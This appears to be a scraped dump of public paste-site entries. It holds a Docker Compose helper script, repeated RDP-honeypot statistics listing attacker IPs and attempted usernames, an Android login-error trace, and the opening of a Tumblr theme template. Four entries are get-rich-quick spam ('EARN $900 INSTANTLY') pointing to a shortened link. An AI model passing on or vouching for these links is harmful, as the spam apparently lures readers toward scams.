id,title,username,language,date,content
jQxHuJh2,⭐EARN $900 INSTANTLY 2025 MI,KINGHARLEXX,JavaScript,Tuesday 8th of April 2025 07:21:48 PM CDT," 
Pdf https://surl.li/lgybtn


SPcfxcYr16
"
sRECYezg,Untitled,pkeffect,Python,Tuesday 8th of April 2025 07:19:35 PM CDT,"#!/usr/bin/env python3
""""""
Docker Compose Startup Helper (Python Version)

This script automatically finds and runs Docker Compose files with
proper error handling and status reporting.

Features:
- Automatically detects common Docker Compose filenames
- Provides clear visual feedback with colored output
- Handles errors gracefully with descriptive messages
- Cross-platform support (Windows, macOS, Linux)
- Displays running containers after successful startup

Usage:
    python docker_compose_helper.py

Returns:
    0: Success - Docker Compose started successfully
    1: Error - No valid Docker Compose file found
    2: Error - Docker Compose command failed
    3: Error - Docker daemon not running
    4: Error - Docker Compose not available
    130: Error - Script interrupted by user
""""""

import os
import sys
import subprocess
from pathlib import Path
from typing import List, Optional, Tuple

# ANSI color codes for terminal output
class Colors:
    """"""ANSI color codes for terminal output formatting.""""""
    GREEN = ""\033[0;32m""   # Success messages
    RED = ""\033[0;31m""     # Error messages
    YELLOW = ""\033[0;33m""  # Warning or information messages
    BLUE = ""\033[0;34m""    # Status or processing messages
    CYAN = ""\033[0;36m""    # Additional highlighting
    BOLD = ""\033[1m""       # Bold text
    NC = ""\033[0m""         # No Color (reset)

# Status icons for visual feedback
class Icons:
    """"""Unicode icons for visual status indication.""""""
    SUCCESS = ""✅""  # Success indicator
    ERROR = ""❌""    # Error indicator
    INFO = ""ℹ️""     # Information indicator
    ROCKET = ""🚀""  # Process starting indicator
    FOLDER = ""📂""  # Directory/location indicator
    SEARCH = ""🔍""  # Search/check indicator
    TIP = ""💡""     # Suggestion/tip indicator
    DOCKER = ""🐳""  # Docker-related indicator
    LIST = ""📋""    # List/display indicator
    WARNING = ""⚠️""  # Warning indicator
    CHECK = ""✓""    # Check/verification indicator

def print_status(icon: str, message: str, color: str) -> None:
    """"""
    Print a colored status message with an icon.
    
    Args:
        icon (str): The icon to display before the message.
        message (str): The message to display.
        color (str): The ANSI color code to use.
    """"""
    print(f""{color}{icon} {message}{Colors.NC}"")

def print_header(title: str) -> None:
    """"""
    Print a formatted header with title.
    
    Args:
        title (str): The title text for the header.
    """"""
    border = ""="" * (len(title) + 10)
    print(f""\n{Colors.BOLD}{Colors.BLUE}{border}"")
    print(f""    {title}"")
    print(f""{border}{Colors.NC}\n"")

def check_command_exists(command: str) -> bool:
    """"""
    Check if a command exists and is executable in the system path.
    
    Args:
        command (str): The command to check.
        
    Returns:
        bool: True if the command exists and is executable, False otherwise.
    """"""
    try:
        # Use 'which' on Unix-like systems and 'where' on Windows
        check_cmd = ""which"" if sys.platform != ""win32"" else ""where""
        result = subprocess.run(
            [check_cmd, command],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False
        )
        return result.returncode == 0
    except Exception:
        return False

def run_command(command: List[str]) -> Tuple[int, str, str]:
    """"""
    Run a system command and return its results.
    
    Args:
        command (List[str]): The command to run as a list of strings.
        
    Returns:
        Tuple[int, str, str]: A tuple containing:
            - Exit code (int)
            - Standard output (str)
            - Standard error (str)
    """"""
    try:
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            universal_newlines=True
        )
        stdout, stderr = process.communicate()
        return process.returncode, stdout, stderr
    except Exception as e:
        return 1, """", str(e)

def check_docker() -> bool:
    """"""
    Check if Docker daemon is running.
    
    Returns:
        bool: True if Docker daemon is running, False otherwise.
    """"""
    print_status(Icons.SEARCH, ""Checking if Docker daemon is running..."", Colors.YELLOW)
    
    # First check if docker command is available
    if not check_command_exists(""docker""):
        print_status(Icons.ERROR, ""Docker command not found! Please install Docker first."", Colors.RED)
        return False
        
    # Then check if docker daemon is running
    exit_code, _, stderr = run_command([""docker"", ""info""])
    if exit_code != 0:
        print_status(Icons.ERROR, ""Docker daemon is not running! Please start Docker first."", Colors.RED)
        if stderr:
            print(f""{Colors.RED}Error details: {stderr.strip()}{Colors.NC}"")
        return False
        
    print_status(Icons.SUCCESS, ""Docker daemon is running."", Colors.GREEN)
    return True

def check_docker_compose() -> bool:
    """"""
    Check if Docker Compose is available.
    
    Returns:
        bool: True if Docker Compose is available, False otherwise.
    """"""
    print_status(Icons.SEARCH, ""Checking if Docker Compose is available..."", Colors.YELLOW)
    
    exit_code, stdout, _ = run_command([""docker"", ""compose"", ""version""])
    if exit_code != 0:
        print_status(Icons.ERROR, ""Docker Compose is not available. Please install it first."", Colors.RED)
        return False
        
    # Extract and display version for informational purposes
    if stdout:
        version_line = stdout.strip().split('\n')[0]
        print_status(Icons.SUCCESS, f""Docker Compose is available: {version_line}"", Colors.GREEN)
    else:
        print_status(Icons.SUCCESS, ""Docker Compose is available."", Colors.GREEN)
        
    return True

def find_compose_file(current_dir: Path) -> Optional[str]:
    """"""
    Find a Docker Compose file in the current directory.
    
    Args:
        current_dir (Path): The directory to search in.
        
    Returns:
        Optional[str]: The name of the found compose file, or None if not found.
    """"""
    # Standard Docker Compose filenames in order of preference
    compose_files = [
        ""compose.yaml"",
        ""compose.yml"", 
        ""docker-compose.yaml"", 
        ""docker-compose.yml""
    ]
    
    print_status(Icons.SEARCH, ""Searching for Docker Compose files:"", Colors.YELLOW)
    
    for file in compose_files:
        file_path = current_dir / file
        if file_path.exists():
            print_status(Icons.SUCCESS, f""Found: {file}"", Colors.GREEN)
            return file
        else:
            print_status(Icons.INFO, f""Not found: {file}"", Colors.YELLOW)
    
    return None

def display_running_containers(compose_file: str) -> None:
    """"""
    Display currently running containers from the Docker Compose setup.
    
    Args:
        compose_file (str): The Docker Compose file name.
    """"""
    print()
    print_status(Icons.LIST, ""Currently running containers:"", Colors.BLUE)
    
    # Get running containers
    exit_code, stdout, stderr = run_command([""docker"", ""compose"", ""-f"", compose_file, ""ps""])
    
    if stdout:
        print(f""{Colors.CYAN}{stdout}{Colors.NC}"")
    elif exit_code != 0:
        print_status(Icons.WARNING, ""Could not list containers."", Colors.YELLOW)
        if stderr:
            print(f""{Colors.RED}{stderr}{Colors.NC}"")

def main() -> int:
    """"""
    Main function to run the Docker Compose startup script.
    
    This function:
    1. Checks prerequisites (Docker daemon, Docker Compose)
    2. Finds a Docker Compose file in the current directory
    3. Starts the Docker Compose services
    4. Displays running containers on success
    
    Returns:
        int: Exit code indicating success (0) or specific failure (1-4, 130)
    """"""
    try:
        # Display script header
        print_header(""Docker Compose Startup Helper"")
        
        # Check prerequisites
        print_status(Icons.INFO, ""Checking prerequisites..."", Colors.BLUE)
        
        if not check_docker():
            return 3
        
        if not check_docker_compose():
            return 4
        
        # Get current directory
        current_dir = Path.cwd()
        print()
        print_status(Icons.FOLDER, f""Working directory: {current_dir}"", Colors.BLUE)
        
        # Find Docker Compose file
        compose_file = find_compose_file(current_dir)
        
        if not compose_file:
            print()
            print_status(Icons.ERROR, f""Error: No valid Docker Compose file found in {current_dir}!"", Colors.RED)
            print()
            print_status(Icons.TIP, ""Tip: Create one of these files:"", Colors.YELLOW)
            print(f""{Colors.YELLOW}  - compose.yaml (recommended)"")
            print(f""  - compose.yml"")
            print(f""  - docker-compose.yaml"")
            print(f""  - docker-compose.yml{Colors.NC}"")
            return 1
        
        # Run Docker Compose
        print()
        print_status(Icons.ROCKET, f""Starting services from {compose_file}..."", Colors.BLUE)
        print()
        
        exit_code, stdout, stderr = run_command([""docker"", ""compose"", ""-f"", compose_file, ""up"", ""-d""])
        
        if stdout:
            print(f""{Colors.CYAN}{stdout}{Colors.NC}"")
        
        if exit_code == 0:
            print()
            print_status(Icons.SUCCESS, ""Services started successfully!"", Colors.GREEN)
            
            # Display running containers
            display_running_containers(compose_file)
        else:
            print()
            print_status(Icons.ERROR, f""Docker Compose failed with exit code: {exit_code}"", Colors.RED)
            
            if stderr:
                print(f""{Colors.RED}{stderr}{Colors.NC}"")
                
            print_status(Icons.SEARCH, ""Possible issues:"", Colors.YELLOW)
            print(f""{Colors.YELLOW}  - Check the syntax in {compose_file}"")
            print(""  - Ensure Docker daemon is running properly"")
            print(""  - Verify network connectivity for image pulling"")
            print(""  - Check for port conflicts with existing services"")
            print(f""  - Verify environment variables referenced in {compose_file}{Colors.NC}"")
            return 2
        
        # Success message with instructions
        print()
        print_status(Icons.TIP, ""Useful commands:"", Colors.CYAN)
        print(f""{Colors.CYAN}  - View logs: docker compose -f {compose_file} logs"")
        print(f""  - Stop services: docker compose -f {compose_file} down"")
        print(f""  - Restart services: docker compose -f {compose_file} restart{Colors.NC}"")
        
        # Optional pause to view results
        print()
        input(f""{Colors.BOLD}Press Enter to exit...{Colors.NC}"")
        return 0
        
    except KeyboardInterrupt:
        print(""\n"")
        print_status(Icons.INFO, ""Script interrupted by user."", Colors.YELLOW)
        return 130

if __name__ == ""__main__"":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(""\n"")
        print_status(Icons.INFO, ""Script interrupted by user."", Colors.YELLOW)
        sys.exit(130)
    except Exception as e:
        print(""\n"")
        print_status(Icons.ERROR, f""Unexpected error occurred:"", Colors.RED)
        print(f""{Colors.RED}{str(e)}{Colors.NC}"")
        
        # Print stack trace in development environments
        if os.environ.get(""DEBUG"", """").lower() in (""1"", ""true"", ""yes""):
            import traceback
            print(f""{Colors.RED}{traceback.format_exc()}{Colors.NC}"")
            
        sys.exit(1)"
cmU9imL6,2025-04-07_stats.json,rdp_snitch,JSON,Tuesday 8th of April 2025 07:18:23 PM CDT,"{
  ""ip"": {
    ""156.146.57.52"": 8196,
    ""150.95.30.49"": 3777,
    ""138.199.24.6"": 60189,
    ""150.95.89.149"": 8112,
    ""15.204.41.136"": 3348,
    ""138.199.24.30"": 7212,
    ""156.146.57.110"": 32676,
    ""156.146.57.174"": 8184,
    ""194.165.16.166"": 6,
    ""106.14.144.233"": 435,
    ""147.185.132.63"": 9,
    ""92.255.85.92"": 12,
    ""80.94.95.90"": 12,
    ""146.190.105.191"": 1764,
    ""92.255.57.11"": 3,
    ""178.20.129.235"": 3,
    ""147.182.229.114"": 681,
    ""205.210.31.71"": 9,
    ""147.135.222.78"": 3,
    ""5.42.223.84"": 3,
    ""84.17.45.14"": 2745,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""58.218.199.219"": 15,
    ""91.238.181.94"": 6,
    ""147.185.132.138"": 9,
    ""43.133.180.36"": 3,
    ""45.227.254.130"": 9,
    ""194.165.16.165"": 6,
    ""121.142.5.105"": 6,
    ""147.185.132.129"": 9
  },
  ""asn"": {
    ""AS212238"": 49056,
    ""AS135161"": 11889,
    ""AS60068"": 70146,
    ""AS16276"": 3351,
    ""AS48721"": 12,
    ""AS37963"": 435,
    ""AS396982"": 36,
    ""AS207566"": 15,
    ""AS204428"": 12,
    ""AS14061"": 2445,
    ""AS24810"": 3,
    ""AS200436"": 3,
    ""AS208046"": 9,
    ""AS213438"": 9,
    ""AS4134"": 15,
    ""AS49434"": 6,
    ""AS132203"": 3,
    ""AS267784"": 9,
    ""AS4766"": 6
  },
  ""isp"": {
    ""Datacamp Limited"": 51801,
    ""GMO-Z.COM PTE. LTD."": 11889,
    ""DataCamp Limited"": 67401,
    ""OVH SAS"": 3351,
    ""Flyservers S.A."": 21,
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""Google LLC"": 36,
    ""Chang Way Technologies Co. Limited"": 15,
    ""SS-Net"": 12,
    ""DigitalOcean, LLC"": 2445,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Patron Technology Persia Ltd"": 3,
    ""ColocationX Ltd."": 9,
    ""ColocaTel Inc."": 9,
    ""Chinanet"": 15,
    ""Datacenter location PAR1 France"": 6,
    ""Shenzhen Tencent Computer Systems Company Limited"": 3,
    ""Korea Telecom"": 6
  },
  ""org"": {
    ""Datacamp Limited"": 49056,
    ""Zcom Thai"": 11889,
    ""Cdn77 SGP"": 67401,
    ""OVH US LLC"": 3348,
    ""Flyservers S.A"": 12,
    ""Aliyun Computing Co., LTD"": 435,
    ""Palo Alto Networks, Inc"": 36,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Unmanaged LTD"": 12,
    ""DigitalOcean, LLC"": 2445,
    ""Teleset LLC"": 3,
    ""OVH"": 3,
    ""Tehran Gaming LTD"": 3,
    ""Cdn77 LAX CS2"": 2745,
    ""ColocationX Ltd"": 9,
    ""ColocaTel Inc"": 9,
    ""Chinanet JS"": 15,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Tencent Cloud Computing"": 3,
    ""Xwin Universal LTD"": 9,
    ""Kornet"": 6
  },
  ""regionName"": {
    ""North West"": 116457,
    ""Bangkok"": 3777,
    ""Tokyo"": 8115,
    ""Oregon"": 3348,
    ""Kaunas"": 12,
    ""Shanghai"": 435,
    ""California"": 3462,
    ""Moscow"": 15,
    ""Sofia-Capital"": 12,
    ""South West"": 1764,
    ""Tatarstan Republic"": 3,
    ""\u00cele-de-France"": 9,
    ""Tehran"": 3,
    ""Virginia"": 9,
    ""North Holland"": 9,
    ""Jiangsu"": 15,
    ""Vilnius"": 9,
    ""Incheon"": 6
  },
  ""country"": {
    ""Singapore"": 118221,
    ""Thailand"": 3777,
    ""Japan"": 8115,
    ""United States"": 6819,
    ""Lithuania"": 21,
    ""China"": 450,
    ""Russia"": 18,
    ""Bulgaria"": 12,
    ""France"": 9,
    ""Iran"": 3,
    ""The Netherlands"": 9,
    ""South Korea"": 6
  },
  ""account"": {
    ""hello"": 137346,
    ""Test"": 33,
    ""ucaDfTkkt"": 3,
    ""rnadpb"": 3,
    ""toctun"": 3,
    ""Administr"": 15,
    ""iVBevsVmn"": 3,
    ""MhiXMK"": 3,
    ""ZwhCRP"": 3,
    ""Domain"": 30,
    ""flDEPiCtt"": 3,
    ""GDxIdo"": 3,
    ""JPBKsZ"": 3,
    ""OUhUNXikh"": 3,
    ""gzPLhJ"": 3,
    ""sFYlFf"": 3
  },
  ""keyboard"": {
    ""Unknown"": 137460
  },
  ""client_build"": {
    ""Unknown"": 137460
  },
  ""client_name"": {
    ""Unknown"": 137460
  },
  ""ip_type"": {
    ""hosting & proxy"": 122082,
    ""hosting"": 15285,
    ""Unknown"": 63,
    ""proxy"": 30
  }
}"
1jAiNJiW,2025-04-07_stats.json,rdp_snitch,JSON,Tuesday 8th of April 2025 07:16:19 PM CDT,"{
  ""ip"": {
    ""156.146.57.52"": 8195,
    ""150.95.30.49"": 3776,
    ""138.199.24.6"": 60188,
    ""150.95.89.149"": 8111,
    ""15.204.41.136"": 3347,
    ""138.199.24.30"": 7212,
    ""156.146.57.110"": 32676,
    ""156.146.57.174"": 8184,
    ""194.165.16.166"": 6,
    ""106.14.144.233"": 435,
    ""147.185.132.63"": 9,
    ""92.255.85.92"": 12,
    ""80.94.95.90"": 12,
    ""146.190.105.191"": 1764,
    ""92.255.57.11"": 3,
    ""178.20.129.235"": 3,
    ""147.182.229.114"": 681,
    ""205.210.31.71"": 9,
    ""147.135.222.78"": 3,
    ""5.42.223.84"": 3,
    ""84.17.45.14"": 2745,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""58.218.199.219"": 15,
    ""91.238.181.94"": 6,
    ""147.185.132.138"": 9,
    ""43.133.180.36"": 3,
    ""45.227.254.130"": 9,
    ""194.165.16.165"": 6,
    ""121.142.5.105"": 6,
    ""147.185.132.129"": 9
  },
  ""asn"": {
    ""AS212238"": 49055,
    ""AS135161"": 11887,
    ""AS60068"": 70145,
    ""AS16276"": 3350,
    ""AS48721"": 12,
    ""AS37963"": 435,
    ""AS396982"": 36,
    ""AS207566"": 15,
    ""AS204428"": 12,
    ""AS14061"": 2445,
    ""AS24810"": 3,
    ""AS200436"": 3,
    ""AS208046"": 9,
    ""AS213438"": 9,
    ""AS4134"": 15,
    ""AS49434"": 6,
    ""AS132203"": 3,
    ""AS267784"": 9,
    ""AS4766"": 6
  },
  ""isp"": {
    ""Datacamp Limited"": 51800,
    ""GMO-Z.COM PTE. LTD."": 11887,
    ""DataCamp Limited"": 67400,
    ""OVH SAS"": 3350,
    ""Flyservers S.A."": 21,
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""Google LLC"": 36,
    ""Chang Way Technologies Co. Limited"": 15,
    ""SS-Net"": 12,
    ""DigitalOcean, LLC"": 2445,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Patron Technology Persia Ltd"": 3,
    ""ColocationX Ltd."": 9,
    ""ColocaTel Inc."": 9,
    ""Chinanet"": 15,
    ""Datacenter location PAR1 France"": 6,
    ""Shenzhen Tencent Computer Systems Company Limited"": 3,
    ""Korea Telecom"": 6
  },
  ""org"": {
    ""Datacamp Limited"": 49055,
    ""Zcom Thai"": 11887,
    ""Cdn77 SGP"": 67400,
    ""OVH US LLC"": 3347,
    ""Flyservers S.A"": 12,
    ""Aliyun Computing Co., LTD"": 435,
    ""Palo Alto Networks, Inc"": 36,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Unmanaged LTD"": 12,
    ""DigitalOcean, LLC"": 2445,
    ""Teleset LLC"": 3,
    ""OVH"": 3,
    ""Tehran Gaming LTD"": 3,
    ""Cdn77 LAX CS2"": 2745,
    ""ColocationX Ltd"": 9,
    ""ColocaTel Inc"": 9,
    ""Chinanet JS"": 15,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Tencent Cloud Computing"": 3,
    ""Xwin Universal LTD"": 9,
    ""Kornet"": 6
  },
  ""regionName"": {
    ""North West"": 116455,
    ""Bangkok"": 3776,
    ""Tokyo"": 8114,
    ""Oregon"": 3347,
    ""Kaunas"": 12,
    ""Shanghai"": 435,
    ""California"": 3462,
    ""Moscow"": 15,
    ""Sofia-Capital"": 12,
    ""South West"": 1764,
    ""Tatarstan Republic"": 3,
    ""\u00cele-de-France"": 9,
    ""Tehran"": 3,
    ""Virginia"": 9,
    ""North Holland"": 9,
    ""Jiangsu"": 15,
    ""Vilnius"": 9,
    ""Incheon"": 6
  },
  ""country"": {
    ""Singapore"": 118219,
    ""Thailand"": 3776,
    ""Japan"": 8114,
    ""United States"": 6818,
    ""Lithuania"": 21,
    ""China"": 450,
    ""Russia"": 18,
    ""Bulgaria"": 12,
    ""France"": 9,
    ""Iran"": 3,
    ""The Netherlands"": 9,
    ""South Korea"": 6
  },
  ""account"": {
    ""hello"": 137341,
    ""Test"": 33,
    ""ucaDfTkkt"": 3,
    ""rnadpb"": 3,
    ""toctun"": 3,
    ""Administr"": 15,
    ""iVBevsVmn"": 3,
    ""MhiXMK"": 3,
    ""ZwhCRP"": 3,
    ""Domain"": 30,
    ""flDEPiCtt"": 3,
    ""GDxIdo"": 3,
    ""JPBKsZ"": 3,
    ""OUhUNXikh"": 3,
    ""gzPLhJ"": 3,
    ""sFYlFf"": 3
  },
  ""keyboard"": {
    ""Unknown"": 137455
  },
  ""client_build"": {
    ""Unknown"": 137455
  },
  ""client_name"": {
    ""Unknown"": 137455
  },
  ""ip_type"": {
    ""hosting & proxy"": 122080,
    ""hosting"": 15282,
    ""Unknown"": 63,
    ""proxy"": 30
  }
}"
SP71TdhK,2025-04-07_stats.json,rdp_snitch,JSON,Tuesday 8th of April 2025 07:15:17 PM CDT,"{
  ""ip"": {
    ""156.146.57.52"": 8194,
    ""150.95.30.49"": 3775,
    ""138.199.24.6"": 60187,
    ""150.95.89.149"": 8110,
    ""15.204.41.136"": 3346,
    ""138.199.24.30"": 7212,
    ""156.146.57.110"": 32676,
    ""156.146.57.174"": 8184,
    ""194.165.16.166"": 6,
    ""106.14.144.233"": 435,
    ""147.185.132.63"": 9,
    ""92.255.85.92"": 12,
    ""80.94.95.90"": 12,
    ""146.190.105.191"": 1764,
    ""92.255.57.11"": 3,
    ""178.20.129.235"": 3,
    ""147.182.229.114"": 681,
    ""205.210.31.71"": 9,
    ""147.135.222.78"": 3,
    ""5.42.223.84"": 3,
    ""84.17.45.14"": 2745,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""58.218.199.219"": 15,
    ""91.238.181.94"": 6,
    ""147.185.132.138"": 9,
    ""43.133.180.36"": 3,
    ""45.227.254.130"": 9,
    ""194.165.16.165"": 6,
    ""121.142.5.105"": 6,
    ""147.185.132.129"": 9
  },
  ""asn"": {
    ""AS212238"": 49054,
    ""AS135161"": 11885,
    ""AS60068"": 70144,
    ""AS16276"": 3349,
    ""AS48721"": 12,
    ""AS37963"": 435,
    ""AS396982"": 36,
    ""AS207566"": 15,
    ""AS204428"": 12,
    ""AS14061"": 2445,
    ""AS24810"": 3,
    ""AS200436"": 3,
    ""AS208046"": 9,
    ""AS213438"": 9,
    ""AS4134"": 15,
    ""AS49434"": 6,
    ""AS132203"": 3,
    ""AS267784"": 9,
    ""AS4766"": 6
  },
  ""isp"": {
    ""Datacamp Limited"": 51799,
    ""GMO-Z.COM PTE. LTD."": 11885,
    ""DataCamp Limited"": 67399,
    ""OVH SAS"": 3349,
    ""Flyservers S.A."": 21,
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""Google LLC"": 36,
    ""Chang Way Technologies Co. Limited"": 15,
    ""SS-Net"": 12,
    ""DigitalOcean, LLC"": 2445,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Patron Technology Persia Ltd"": 3,
    ""ColocationX Ltd."": 9,
    ""ColocaTel Inc."": 9,
    ""Chinanet"": 15,
    ""Datacenter location PAR1 France"": 6,
    ""Shenzhen Tencent Computer Systems Company Limited"": 3,
    ""Korea Telecom"": 6
  },
  ""org"": {
    ""Datacamp Limited"": 49054,
    ""Zcom Thai"": 11885,
    ""Cdn77 SGP"": 67399,
    ""OVH US LLC"": 3346,
    ""Flyservers S.A"": 12,
    ""Aliyun Computing Co., LTD"": 435,
    ""Palo Alto Networks, Inc"": 36,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Unmanaged LTD"": 12,
    ""DigitalOcean, LLC"": 2445,
    ""Teleset LLC"": 3,
    ""OVH"": 3,
    ""Tehran Gaming LTD"": 3,
    ""Cdn77 LAX CS2"": 2745,
    ""ColocationX Ltd"": 9,
    ""ColocaTel Inc"": 9,
    ""Chinanet JS"": 15,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Tencent Cloud Computing"": 3,
    ""Xwin Universal LTD"": 9,
    ""Kornet"": 6
  },
  ""regionName"": {
    ""North West"": 116453,
    ""Bangkok"": 3775,
    ""Tokyo"": 8113,
    ""Oregon"": 3346,
    ""Kaunas"": 12,
    ""Shanghai"": 435,
    ""California"": 3462,
    ""Moscow"": 15,
    ""Sofia-Capital"": 12,
    ""South West"": 1764,
    ""Tatarstan Republic"": 3,
    ""\u00cele-de-France"": 9,
    ""Tehran"": 3,
    ""Virginia"": 9,
    ""North Holland"": 9,
    ""Jiangsu"": 15,
    ""Vilnius"": 9,
    ""Incheon"": 6
  },
  ""country"": {
    ""Singapore"": 118217,
    ""Thailand"": 3775,
    ""Japan"": 8113,
    ""United States"": 6817,
    ""Lithuania"": 21,
    ""China"": 450,
    ""Russia"": 18,
    ""Bulgaria"": 12,
    ""France"": 9,
    ""Iran"": 3,
    ""The Netherlands"": 9,
    ""South Korea"": 6
  },
  ""account"": {
    ""hello"": 137336,
    ""Test"": 33,
    ""ucaDfTkkt"": 3,
    ""rnadpb"": 3,
    ""toctun"": 3,
    ""Administr"": 15,
    ""iVBevsVmn"": 3,
    ""MhiXMK"": 3,
    ""ZwhCRP"": 3,
    ""Domain"": 30,
    ""flDEPiCtt"": 3,
    ""GDxIdo"": 3,
    ""JPBKsZ"": 3,
    ""OUhUNXikh"": 3,
    ""gzPLhJ"": 3,
    ""sFYlFf"": 3
  },
  ""keyboard"": {
    ""Unknown"": 137450
  },
  ""client_build"": {
    ""Unknown"": 137450
  },
  ""client_name"": {
    ""Unknown"": 137450
  },
  ""ip_type"": {
    ""hosting & proxy"": 122078,
    ""hosting"": 15279,
    ""Unknown"": 63,
    ""proxy"": 30
  }
}"
qWte6QeH,⭐Make $1000 15-MINUTES (BEGINNER) UU,KINGHARLEXX,JavaScript,Tuesday 8th of April 2025 07:08:21 PM CDT," 
Pdf https://surl.li/lgybtn


6V6bqVZcwR
"
YTYUR5wL,EARN $900 INSTANTLY 2025⭐ YF,KINGHARLEXX,JavaScript,Tuesday 8th of April 2025 06:54:54 PM CDT," 
Pdf https://surl.li/lgybtn


olUpck0rjI
"
q7nLQzSx,2025-04-09T02:50:34.112570,powerampache,PHP,Tuesday 8th of April 2025 06:50:34 PM CDT,"1.01-79 (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.MusicException: {""errorAction"":""handshake"",""errorCode"":""4701"",""errorMessage"":""Received Invalid Handshake - Incorrect username or password"",""errorType"":""account""}
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl.tryAuthorize(MusicRepositoryImpl.kt:268)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl.access$tryAuthorize(MusicRepositoryImpl.kt:83)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl$tryAuthorize$1.invokeSuspend(Unknown Source:18)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:958)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loopOnce(Looper.java:230)
	at android.os.Looper.loop(Looper.java:319)
	at android.app.ActivityThread.main(ActivityThread.java:8919)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:578)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1103)

authorize() - {""errorAction"":""handshake"",""errorCode"":""4701"",""errorMessage"":""Received Invalid Handshake - Incorrect username or password"",""errorType"":""account""}"
U0k3e3Xz,Make $1000 15-MINUTES ⭐ (BEGINNER) BB,KINGHARLEXX,JavaScript,Tuesday 8th of April 2025 06:41:29 PM CDT," 
Pdf https://surl.li/lgybtn


TAgDjL3sjB
"
uNhwaM1x,crawl | rec page,southcodes,CSS,Tuesday 8th of April 2025 06:31:08 PM CDT,"<!-- 
    
    - page 'crawl' by skye southcodes.tumblr.com
    - modify as you please but please do not touch the credit
    - any errors? need help? have questions? let me know!
    southcodes.tumblr.com/inbox
    
    - normalize css by https://github.com/necolas
    - fonts by google
    - icon font by https://fontawesome.com/icons
    - isotope filteres by https://isotope.metafizzy.co/

    how to customzie filters: https://hendrixrph-blog.tumblr.com/post/131707989334/under-the-cut-is-a-tutorial-on-how-to-create-a

-->

<!DOCTYPE html>
<html>
<head>
	<title>{title}</title>

	<meta charset=""UTF-8"">
    <meta name=""description"" content=""{MetaDescription}""/>
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
 
    <link rel=""shortcut icon"" href=""{favicon}"">
    <link rel=""alternate"" type=""application/rss+xml"" href=""{RSS}"">
    
    <!-- fonts -->
    <link rel=""preconnect"" href=""https://fonts.googleapis.com"">
    <link rel=""preconnect"" href=""https://fonts.gstatic.com"" crossorigin>
    <link href=""https://fonts.googleapis.com/css2?family=Karla:ital,wght@0,200..800;1,200..800&family=Montserrat+Underline:ital,wght@0,100..900;1,100..900&family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap"" rel=""stylesheet"">
    
<style>
:root {
    --background:#f4f4f4;
    --boxes-background:#fff;
    --background-square:lightblue;
    --first-header-square:lightblue;
    --second-header-square:rgb(217, 242, 250);
    --text: rgba(0, 0, 0);
    --note-text:#555;
    --links: #6a89bb;
    --links-hover: rgb(23, 59, 80);
    --borders:#ccc;
    --accents:#aadde4;
}

* {margin:0;padding:0;box-sizing: border-box;}
p {margin:1rem 0}
html{font-size: 16px}
body {font: 1rem 'Karla', sans-serif;color:var(--text);background-color: var(--background);letter-spacing: .05rem;}
a {text-decoration: none;color:var(--links);transition-duration: .2s;}
a:hover {color:var(--links-hover);}
b {font-weight: 600}
ol,ul,li {list-style-type:none;}
hr {border:0;border-top:1px solid var(--borders);margin:auto;width: 100%;}

::-webkit-scrollbar-thumb:vertical {border-left:2px solid var(--accents);}
::-webkit-scrollbar {width:6px;height:0;background-color: transparent;}
::-webkit-scrollbar-track-piece{margin:5px 0;}

#background-square {
    position: fixed;
    inset: auto 0 0 auto;
    width: 30vw;
    aspect-ratio: 1 / 1;
    z-index: -1;
    background-color: var(--background-square);
}

/* container */

#container {display: flex;}

/* filters */

#hamburger-checkbox {display: none;}

#hamburger-checkbox:checked~#filters-wrapper {
    transition: 2s ease;
    transform: translateX(0px);
}

.hamburger {
    display:none;
    position: fixed;
    inset:1rem auto auto 1rem;
    z-index: 9999!important;
    padding:.5rem .7rem;
    border: 1px solid var(--borders);
    border-radius: 5px;
    cursor: pointer;
    font-size: 1.5rem;
    color: var(--accents);
    background-color: var(--boxes-background);
}

#filters-wrapper {
    position: fixed;
    inset:0 auto 0 0;
    z-index: 9!important;
    width: 18rem;
    height: 100vh;
    border-right: 1px solid var(--borders);
    background-color: var(--boxes-background);
}

.filters-image {
    width: 100%;
    height: 10rem;
    object-fit:cover
}

#filters-content {
    height: calc(100vh - 10rem);
    overflow: auto;
}

#filters-title {
    margin: 3rem 0 3.5rem;
    padding:0 2rem;
    font-weight:400;
}

#filters-title span {
    box-shadow: inset 0 -10px var(--accents);
    padding:0 .3rem
}

#filters-title::first-letter {text-transform: uppercase;}

#filters {padding:0 2rem 1.5rem 3rem}

#filters .button-group-title {
    margin-bottom: 1rem;
    font-weight:500;
    font-size: 1rem;
    text-transform: uppercase;
}

.button-group {margin-bottom: 3rem;}

#filters button {
    display: block;
    margin-bottom: .8rem;
    padding:0 .2rem .2rem;
    outline:none;
    border: 0;
